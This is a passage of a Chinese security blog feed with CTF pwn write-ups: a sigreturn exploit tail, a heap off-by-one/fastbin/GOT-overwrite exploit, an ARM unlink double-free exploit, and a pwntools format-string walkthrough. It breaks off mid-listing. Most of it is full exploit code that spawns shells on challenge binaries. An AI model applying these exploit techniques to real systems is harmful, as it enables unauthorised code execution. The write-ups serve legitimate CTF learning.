class="string">"\xb3"</span>)</div><div class="line"></div><div class="line"></div><div class="line">stack_addr = u64(p.recv(<span class="number">16</span>)[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x1000</span></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line"></div><div class="line"><span class="comment"># frame </span></div><div class="line"><span class="comment"># call read into stack_addr</span></div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_read</div><div class="line">frame.rdi = <span class="number">0x0</span></div><div class="line">frame.rsi = stack_addr</div><div class="line">frame.rdx = <span class="number">0x400</span></div><div class="line">frame.rsp = stack_addr</div><div class="line">frame.rip = <span class="number">0x4000BE</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)</div><div class="line">payload +=p64(<span class="number">0</span>)+str(frame)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># return</span></div><div class="line">payload = p64(<span class="number">0x4000Be</span>)</div><div class="line">payload += <span class="string">"\x00"</span>*(<span class="number">15</span><span class="number">-8</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#frame</span></div><div class="line"><span class="comment"># write /bin/sh</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rax = constants.SYS_execve</div><div class="line">frame.rdi = stack_addr+<span class="number">0x150</span></div><div class="line">frame.rsi = <span class="number">0x0</span></div><div class="line">frame.rdx = <span class="number">0x0</span></div><div class="line">frame.rsp = stack_addr</div><div class="line">frame.rip = <span class="number">0x4000Be</span></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(<span class="number">0x4000B0</span>)</div><div class="line">payload +=p64(<span class="number">0</span>)+str(frame)</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">0x150</span>-len(payload))+<span class="string">"/bin/sh\x00"</span></div><div class="line">sd(payload)</div><div class="line"></div><div class="line"><span class="comment"># return</span></div><div class="line">payload = p64(<span class="number">0x4000Be</span>)</div><div class="line">payload += <span class="string">"\x00"</span>*(<span class="number">15</span><span class="number">-8</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>用到了很多姿势啊，台湾友人的pwn很强悍，hhhhhhh。</p><p>参考链接：<a href="http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/" target="_blank" rel="external">http://w0lfzhang.me/2017/04/11/2016-HITCON-CTF-babyheap/</a></p><p>非常坑的一点是，在ubuntu16.04下，scanf操作会在heap区域生成最少0x410大小的chunk。。。如果不知道这一点，这题是没法做的。（一定要在ubuntu16.04环境下测试该题哦~</p><p>步骤：</p><p>1、利用scanf在heap区域生成0x1000大小的chunk，在末尾伪造chunk头，注意调整合适的size。我这边调整为0x70的 chunk size</p><p>2、利用null字节溢出导致虚表指针最低位字节变成00字节，指向我们伪造的fake chunk<br>（注意，fake chunk是位于0x18大小的chunk之前的，<br>）</p><p>3、free fake chunk 在下次new的时候，我们申请同样大小的chunk，会从fastbin中拿到我们刚才伪造的fake chunk，同时可以输入内容，覆盖虚表指针，导致任意地址写。。</p><p>4、我们可以利用2操作覆盖掉got表，修改exit为alarm，使我们可以重复利用1、2、3函数。</p><p>5、修改atoi为printf（这姿势第一次），然后通过格式化字符串泄露libc</p><p>6、再次覆写got ，将atoi改成system就好啦。。需要注意的是，printf返回值是他显示的字符数~</p><p>非常nice的一题pwn，收获很大~</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># off-by-one</span></div><div class="line"><span class="comment"># fastbin attack</span></div><div class="line"><span class="comment"># overwrite got</span></div><div class="line"><span class="comment"># fmt</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-20 03:15:30</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./hiddenlove"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment">#gdb.attach(p,"b*0x400B48\nb*0x400A1A\nc")</span></div><div class="line"><span class="comment">#gdb.attach(p,"b*0x4008f4\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 0</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"s for her?(Y/N)\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*(<span class="number">0x1000</span><span class="number">-0x20</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</div><div class="line"></div><div class="line"><span class="comment">## stage 1</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" her(0~1000)\n"</span>)</div><div class="line">sl(str(<span class="number">0x20</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"\x00"</span>*<span class="number">8</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,data)</span>:</span></div><div class="line"><span class="comment">## stage 2</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line"></div><div class="line"><span class="comment">## stage 3 </span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">" her(0~1000)\n"</span>)</div><div class="line">sl(str(<span class="number">0x60</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(addr))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"b"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># stage 4</span></div><div class="line">ru(<span class="string">"t her feet\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"lings\n"</span>)</div><div class="line"></div><div class="line">sd(data)</div><div class="line"></div><div class="line"></div><div class="line">payload = p64(rop.symbols[<span class="string">"free"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"puts"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__stack_chk_fail"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"setbuf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"read"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__libc_start_main"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"malloc"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>)<span class="comment"># change atoi to printf (we can use fmt to leak address</span></div><div class="line">payload +=p64(rop.symbols[<span class="string">"__isoc99_scanf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>) <span class="comment"># change exit to alarm</span></div><div class="line"></div><div class="line"></div><div class="line">edit(rop.got[<span class="string">"free"</span>],payload)</div><div class="line"></div><div class="line"><span class="comment"># leak</span></div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(rop.got[<span class="string">"puts"</span>]))</div><div class="line">puts_addr = u64(ru(<span class="string">"..."</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="comment"># read(0,buf,0x10)</span></div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"%7$s...."</span>+p64(rop.got[<span class="string">"printf"</span>]))<span class="comment"># dl_reslove change printf_got</span></div><div class="line">printf_addr = u64(ru(<span class="string">"..."</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line"></div><div class="line">system_addr = puts_addr-(libc.symbols[<span class="string">"puts"</span>]-libc.symbols[<span class="string">"system"</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span>+hex(system_addr)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># change atoi to system</span></div><div class="line"></div><div class="line">payload = p64(rop.symbols[<span class="string">"free"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"puts"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__stack_chk_fail"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"setbuf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"printf"</span>]+<span class="number">0x6</span>) </div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"read"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"__libc_start_main"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"malloc"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(system_addr)<span class="comment"># change atoi to printf (we can use fmt to leak address</span></div><div class="line">payload +=p64(rop.symbols[<span class="string">"__isoc99_scanf"</span>]+<span class="number">0x6</span>)</div><div class="line">payload +=p64(rop.symbols[<span class="string">"alarm"</span>]+<span class="number">0x6</span>) <span class="comment"># change exit to alarm</span></div><div class="line"></div><div class="line"></div><div class="line">sd(<span class="string">"aa"</span>) <span class="comment"># I have changed atoi to printf,so it return the number of my input chars</span></div><div class="line">ru(<span class="string">"lings\n"</span>)</div><div class="line">sd(payload)</div><div class="line"></div><div class="line">ru(<span class="string">"feet\n"</span>)</div><div class="line">sd(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment"># it's a funny pwn ~~~</span></div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;槽点：这次比赛。。敢不敢。。不放原题。。。做了半天的pwn2，结果是原题。。。 T T  （题目来自hitcon 2016，好吧。。怪我没刷到这题。。&lt;/p&gt;
&lt;p&gt;不过pwn1和pwn2收获都很大，特别记录下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>arm_double_free_attack</title>
    <link href="https://winter3un.github.io/2017/04/10/arm-double-free-attack/"/>
    <id>https://winter3un.github.io/2017/04/10/arm-double-free-attack/</id>
    <published>2017-04-10T15:50:31.000Z</published>
    <updated>2017-04-10T15:56:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>题目来源自 X-NUCA 2016的note题目。题目资料全都可以从我的github上下载。</p><p>简单的堆溢出题目，但是环境在arm上，有一些小坑，比如说0x200的chunk在这边行不通了，只能用0x100的chunk，0x200好像比变成了large chunk，果然基础弱渣在这里是无法生存的。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-09 08:34:41</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="comment"># import roputils</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./note"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*main\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,data)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line"><span class="comment"># raw_input()</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(length))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"the id:"</span>)</div><div class="line">sl(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,data)</span>:</span></div><div class="line">ru(<span class="string">"6. Exit"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(index))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_anyaddr</span><span class="params">(addr,data)</span>:</span></div><div class="line">edit(<span class="number">1</span>,p32(<span class="number">0</span>)+p32(addr))</div><div class="line">edit(<span class="number">0</span>,data)</div><div class="line"></div><div class="line"><span class="comment"># stage 1 unlink</span></div><div class="line">add(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x8</span>)<span class="comment">#0</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"aaa"</span>)<span class="comment">#1  &gt;=0x200会使用large chunk</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"aaa"</span>)<span class="comment">#2</span></div><div class="line">add(<span class="number">0x100</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#3</span></div><div class="line">junk = <span class="string">"\x00"</span>*<span class="number">8</span></div><div class="line">head = p32(<span class="number">0</span>)*<span class="number">2</span></div><div class="line">fake_head = p32(<span class="number">0</span>)+p32(<span class="number">0x101</span>)</div><div class="line">fd = p32(<span class="number">0x1205C</span>+<span class="number">0x8</span><span class="number">-0xc</span>)</div><div class="line">bk = p32(<span class="number">0x1205C</span>+<span class="number">0x8</span><span class="number">-0x8</span>)</div><div class="line">payload  = junk+head</div><div class="line">payload += fake_head+fd+bk</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">0x100</span>-len(fake_head+fd+bk))</div><div class="line">payload += p32(<span class="number">0x100</span>)+p32(<span class="number">0x108</span>)</div><div class="line">edit(<span class="number">0</span>,payload)</div><div class="line">raw_input()</div><div class="line">dele(<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 edit free_got</span></div><div class="line">edit_anyaddr(<span class="number">0x12024</span>,p32(<span class="number">0x8538</span>)[:<span class="number">-1</span>])<span class="comment">#有零字节溢出，会破坏下一个got</span></div><div class="line">dele(<span class="number">3</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目来源自 X-NUCA 2016的note题目。题目资料全都可以从我的github上下载。&lt;/p&gt;
&lt;p&gt;简单的堆溢出题目，但是环境在arm上，有一些小坑，比如说0x200的chunk在这边行不通了，只能用0x100的chunk，0x200好像比变成了large chun
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="heap overflow" scheme="https://winter3un.github.io/tags/heap-overflow/"/>
    
      <category term="arm" scheme="https://winter3un.github.io/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】 初探pwntools fmt特性</title>
    <link href="https://winter3un.github.io/2017/04/09/%E5%88%9D%E6%8E%A2pwntools-fmt%E7%89%B9%E6%80%A7/"/>
    <id>https://winter3un.github.io/2017/04/09/初探pwntools-fmt特性/</id>
    <published>2017-04-09T15:16:41.000Z</published>
    <updated>2017-04-09T15:18:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。</p><p>官方文档链接  <a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="external">http://pwntools.readthedocs.io/en/stable/fmtstr.html</a></p><p>在本地一看，pwntools还是2.x版本。。官方都已经更新到3.5版本了，于是果断更新= =。。</p><p>漏洞程序是这样子的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+1Ch] [bp-184h]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+9Ch] [bp-104h]@2</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+11Ch] [bp-84h]@2</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+19Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  v6 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  print_welcome();</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"First input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v3);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Second input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v4);</div><div class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">44</span>);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"All is Done"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以直接看到，有两处fmt漏洞，这是个循环，我们只需要循环利用其中一个fmt漏洞就可以。</p><p>我们可以利用pwntools提供fmt自动利用的功能快速算出格式化字符串在栈中的偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">p = process(target)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div></pre></td></tr></table></figure><p>泄露出其中一个库函数地址后，利用我们本地搭建好的libc-database库算出system函数的地址。(如果出现多个匹配的话，就爆破吧:P</p><p>主要的还是它可以自动完成任意地址写的payload，就适合我这种深度懒癌患者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(payload)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">autofmt.write(printf_got,system_addr)</div><div class="line">autofmt.execute_writes()</div></pre></td></tr></table></figure><p>总的exp是这样子的。大概爆破三次就出结果，这还是我只泄露了一个库函数地址的情况下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div 